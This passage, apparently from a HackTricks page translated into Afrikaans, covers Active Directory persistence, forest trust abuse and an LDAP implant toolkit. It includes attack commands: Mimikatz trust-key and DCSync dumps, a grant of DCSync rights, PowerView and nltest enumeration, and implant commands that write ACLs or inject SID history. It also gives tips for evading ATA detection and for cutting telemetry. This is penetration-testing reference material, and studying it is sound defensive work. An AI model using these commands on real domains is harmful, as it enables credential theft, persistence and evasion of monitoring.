Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitieme Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur die **NTLM hash** te gebruik (byvoorbeeld, die **hash van die PC-rekening**). Hierdie metode word gebruik om **toegang tot die diensvoorregte** te verkry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang kry tot die **NTLM hash van die krbtgt-rekening** in 'n Active Directory-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** skep vir enige rekening wat hulle kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets, maar vervalste sodat hulle **algemene golden ticket-detektiemeganismes omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om sertifikate van 'n rekening te hê of die vermoë om dit aan te vra** is 'n baie goeie manier om in die gebruiker se rekening te bly (selfs as hy die wagwoord verander):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Om sertifikate te gebruik maak dit ook moontlik om met hoë voorregte binne die domein te persistent:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-objek in Active Directory verseker die veiligheid van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as 'n aanvaller AdminSDHolder se ACL wysig om volle toegang aan 'n gewone gebruiker te gee, gee daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, bedoel om te beskerm, kan dus terugskiet en ongerechtigde toegang moontlik maak tensy dit noukeurig gemonitor word.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan daar 'n **lokale administrateur**-rekening. Deur adminregte op so 'n masjien te bekom, kan die lokale Administrator-hash uitgehaal word met **mimikatz**. Daarna is 'n registerwysiging nodig om die gebruik van hierdie wagwoord toe te laat, wat remote toegang tot die lokale Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan **sekere spesiale permissies** aan 'n **gebruiker** gee oor spesifieke domeinobjekte wat die gebruiker in staat sal stel om **in die toekoms voorregte op te bou**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissies** wat 'n **objek** oor 'n ander **objek** het, te **stoor**. As jy net 'n **klein verandering** in die **security descriptor** van 'n objek kan maak, kan jy baie interessante voorregte oor daardie objek bekom sonder om 'n lid van 'n bevoorregte groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Wysig **LSASS** in geheue om 'n **universele wagwoord** te vestig, wat toegang tot alle domeinrekeninge toelaat.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer wat 'n SSP (Security Support Provider) is hier.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **credentials** wat gebruik word om op die masjien aan te meld, in **duidelike teks** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om **attribuite** (SIDHistory, SPNs...) op gespesifiseerde objekte te **push** **sonder** om **logs** van die **wysigings** te laat. Jy **have DA** voorregte en moet in die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, tamelik slegte logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Eerder het ons bespreek hoe om voorregte op te bou as jy **genoeg toestemming het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **persistentie te onderhou**.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft sien die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein potensieel tot die hele Forest se kompromittering kan lei**.

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domein** toelaat om hulpbronne in 'n ander **domein** te benader. Dit skep 'n skakeling tussen die verifikasie-stelsels van die twee domeine, wat verifikasie-toegewing moontlik maak om naatloos te vloei. Wanneer domeine 'n trust opstel, ruil en behou hulle spesifieke **sleutels** binne hul **Domain Controllers (DCs)**, wat kardinaal tot die integriteit van die trust is.

In 'n tipiese scenario, as 'n gebruiker 'n diens in 'n **vertroude domein** wil benader, moet hulle eers 'n spesiale ticket vra wat as 'n **inter-realm TGT** bekend staan van hul eie domein se DC. Hierdie TGT is enkripsieer met 'n gedeelde **sleutel** wat albei domeine ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroude domein** om 'n service ticket (**TGS**) te kry. Nadat die vertroude domein se DC die inter-realm TGT suksesvol verifieer, gee dit 'n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **Kliëntrekenaar** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 gee 'n nuwe TGT uit indien die kliënt suksesvol geverifieer is.
3. Die kliënt vra dan 'n **inter-realm TGT** van DC1 wat nodig is om hulpbronne in **Domain 2** te bereik.
4. Die inter-realm TGT is geënkripteer met 'n **trust key** wat DC1 en DC2 deel as deel van die twee-rigting domeintrust.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, gee dit 'n **Ticket Granting Service (TGS)** vir die bediener in Domain 2 wat die kliënt wil bereik.
7. Laastens bied die kliënt hierdie TGS aan die bediener aan, wat met die bediener se rekening-hash geënkripteer is, om toegang tot die diens in Domain 2 te kry.

### Different trusts

Dit is belangrik om op te let dat **'n trust eendelig of tweerigting kan wees**. In die tweerigting-opsie sal beide domeine mekaar vertrou, maar in die **eenrigting** trustverhouding sal een van die domeine die **trusted** en die ander die **trusting** domein wees. In die laaste geval **sal jy slegs toegang tot hulpbronne binne die trusting domein vanaf die trusted een** kan hê.

As Domain A Domain B vertrou, is A die trusting-domein en B die trusted een. Verder, in **Domain A**, sou dit 'n **Outbound trust** wees; en in **Domain B**, sou dit 'n **Inbound trust** wees.

**Verskillende trusting-verhoudings**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n twee-rigting transitive trust met sy parent domain het. Dit beteken in wese dat verifikasieversoeke naatloos tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Bekend as "shortcut trusts," hierdie word opgestel tussen child domains om verwysingsprosesse te versnel. In komplekse forests moet verifikasie-verwysings doorgaans na die forest root en dan af na die teiken-domein reis. Deur cross-links te skep, word die reis bekort, wat veral voordelig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word geskep tussen verskillende, ongehoorende domeine en is van nature nie-transitief nie. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om toegang te verkry tot hulpbronne in 'n domein buite die huidige forest wat nie deur 'n forest trust verbind is nie. Sekuriteit word versterk deur SID filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties gevestig tussen die forest root domain en 'n nuut bygevoegde tree root. Alhoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik vir die byvoeging van nuwe domeinboome tot 'n forest, wat hulle in staat stel om 'n unieke domeinnaam te behou en twee-rigting transitivity te verseker. Meer inligting kan in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) gevind word.
- **Forest Trusts**: Hierdie tipe trust is 'n twee-rigting transitive trust tussen twee forest root-domeine, en impliseer ook SID filtering om sekuriteit te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en rig op omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem benodig.

#### Other differences in **trusting relationships**

- 'n trustverhouding kan ook **transitief** wees (A vertrou B, B vertrou C, dan vertrou A C) of **nie-transitief** nie.
- 'n trustverhouding kan ingestel word as **bidirectionele trust** (albei vertrou mekaar) of as **eenrigting trust** (slegs een vertrou die ander).

### Attack Path

1. **Enumereer** die trusting-verhoudings
2. Kyk of enige **security principal** (gebruiker/groep/rekenaar) **toevoer** het tot hulpbronne van die **ander domein**, dalk deur ACE-inskrywings of deur in groepe van die ander domein te wees. Soek na **verhoudings oor domeine heen** (die trust is waarskynlik vir dit geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Kompromitteer** die **rekeninge** wat deur domeine kan **pivot**.

Aanvallers kan toegang tot hulpbronne in 'n ander domein kry via drie primêre meganismes:

- **Local Group Membership**: Principals kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators” groep op 'n bediener, wat hulle beduidende beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die vreemde domein wees. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat die meganika van ACLs, DACLs en ACEs dieper wil bekyk, is die whitepaper "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" 'n onskatbare hulpbron.

### Find external users/groups with permissions

Jy kan kyk by **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** om foreign security principals in die domein te vind. Hierdie sal gebruikers/groepe van **'n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** nagaan of met powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Kind-na-Ouer forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domeinvertroue te lys:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en 'n ander vir _Parent_ --> _Child_.\
> Jy kan dié wat deur die huidige domein gebruik word sien met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent domein deur die trust te misbruik met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is kritiek om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as 'n sentrale berging vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word gerepliseer na elke Domain Controller (DC) binne die forest, met writable DCs wat 'n skryfbare kopie van die Configuration NC onderhou. Om dit te misbruik, moet 'n aanvaller **SYSTEM privileges on a DC** hê, verkieslik 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites-container sluit inligting in oor alle domain-joined computers se sites binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan aanvallers GPOs koppel aan die root DC sites. Hierdie aksie kan die root domain kompromitteer deur beleide wat op hierdie sites toegepas word te manipuleer.

Vir meer diepgaande inligting, kyk na navorsing oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

'n Aanvalsvector behels die teiken van bevoorregte gMSAs binne die domein. Die KDS Root key, noodsaaklik vir die berekening van gMSA-wagwoorde, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA oor die hele forest te bereken.

Gedetailleerde ontleding en stap-vir-stap gids is te vinde in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Addisionele eksterne navorsing: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode verg geduld en die wag vir die skepping van nuwe bevoorregte AD-objekte. Met SYSTEM privileges kan 'n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD-objekte.

Verder lees oor [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 kwesbaarheid mik op beheer oor Public Key Infrastructure (PKI) objekte om 'n sertifikaattemplate te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objekte in die Configuration NC woon, maak die kompromittering van 'n skryfbare child DC die uitvoer van ESC5-aanvalle moontlik.

Meer besonderhede hieroor is beskikbaar in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS kan die aanvaller die nodige komponente opstel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Eksterne Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domain vertrou** deur 'n eksterne domain wat jou **undetermined permissions** daaroor gee. Jy sal moet vasstel **watter principals van jou domain watter toegang oor die external domain het** en dit dan probeer uitbuit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario vertrou **jou domein** sekere **privilege** aan 'n prinsipaal van **ander domeine**.

Wanneer egter 'n **domein vertrou word** deur die vertrouende domein, skep die vertroude domein 'n **gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die vertroude wagwoord** gebruik. Dit beteken dat dit moontlik is om **'n gebruiker vanaf die vertrouende domein te gebruik om binne die vertroude domein te kom** om dit te enumereer en te probeer om meer voorregte te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertrouing geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om op 'n masjien te wag waar 'n **gebruiker van die vertroude domein** per **RDP** kan aanmeld. Dan kan die aanvaller kode in die RDP-session proses inject en **toegang tot die oorsprongdomein van die slagoffer** van daar af kry.\ Moreover, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP session** proses **backdoors** in die **startup folder of the hard drive** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigasie van misbruik van domeinvertroue

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-attribuut oor forest trusts benut, word gemitigeer deur SID Filtering, wat standaard geaktiveer is op alle inter-forest trusts. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien die forest eerder as die domein as die veiligheidsgrens beskou word volgens Microsoft se standpunt.
- Daar is egter 'n vang: SID filtering kan toepassings en gebruikers se toegang ontwrig, wat soms tot die deaktivering daarvan lei.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geauthentiseer word nie. In plaas daarvan word eksplisiete toestemmings vereis sodat gebruikers toegang tot domeine en bedieners binne die vertrouende domein of forest kan kry.
- Dit is belangrik om te let dat hierdie maatreëls nie beskerming bied teen die misbruik van die writable Configuration Naming Context (NC) of aanvalle op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-style LDAP primitives as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs kompileer die pakket met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon. Alle verkeer ry in die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met auto certificate trust, sodat geen socks proxies of skyffartefakte nodig is nie.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` los kort name/OU-paaie op in volle DNs en dump die ooreenstemmende objekke.
- `get-object`, `get-attribute`, and `get-domaininfo` haal arbitrêre attributte (insluitend security descriptors) plus die forest/domain metadata van `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` openbaar roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parseer die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis te lys, wat onmiddellike teikens vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP-skryfprimitiewe vir eskalasie en persistensie

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur nuwe identiteite of masjienrekeninge stage waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kaap teikens direk sodra skryf-eienskapsregte gevind word.
- ACL-gefokusde kommando's soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-objek in wagwoordherstellings, groeplidmaatskapbeheer, of DCSync-repliseringsprivilege sonder om PowerShell/ADSI-artefakte agter te laat. Die `remove-*` eweknieë ruim ingespuitte ACEs op.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` maak `n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die wagwoord te raak.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalsroetes moontlik maak en die behoefte aan remote PowerShell of RSAT elimineer.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injects privileged SIDs into a controlled principal’s SID history (see [SID-History Injection](sid-history-injection.md)), providing stealthy access inheritance fully over LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat 'n aanvaller toelaat om bates te skuif na OUs waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Beperkte verwyderingskommando's (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige rollback toe nadat die operateur credentials of persistensie ingesamel het, wat telemetrie minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir geloofsbriefbeskerming**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om op Domain Controllers aan te meld, en nie op ander hosts gebruik word nie.
- **Service Account Privileges**: Dienste moet nie met Domain Admin (DA) voorregte uitgevoer word nie om sekuriteit te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA-voorregte benodig, moet hul duur beperk word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ouditeer Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding af op DCs/clients om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementering van misleidingstegnieke**

- Implementering van misleiding behels die stel van lokaas, soos lokgebruikers of -rekenaars, met kenmerke soos wagwoorde wat nie verstryk nie of wat gemerk is as Trusted for Delegation. 'n Gedetaileerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë-privilegie-groepe te voeg.
- 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van misleidingstegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van misleiding**

- **For User Objects**: Verdagte aanwysers sluit in atypiese ObjectSID, seldsame aanmeldings, skeppingsdatums, en lae tellinge van verkeerde wagwoorde.
- **General Indicators**: Vergelyking van attributte van potensiële lokaasobjekte met dié van werklike objekte kan inkonsekwenthede openbaar. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke misleidings te identifiseer.

### **Omseiling van opsporingstelsels**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy sessie-enumerasie op Domain Controllers om ATA-opsporing te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes**-sleutels vir ticket-creation help om opsporing te ontduik deur nie na NTLM af te gradeer nie.
- **DCSync Attacks**: Uitvoering vanaf 'n nie-Domain Controller word aanbeveel om ATA-opsporing te vermy, aangesien direkte uitvoering vanaf 'n Domain Controller waarskuwings sal veroorsaak.

## Verwysings

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
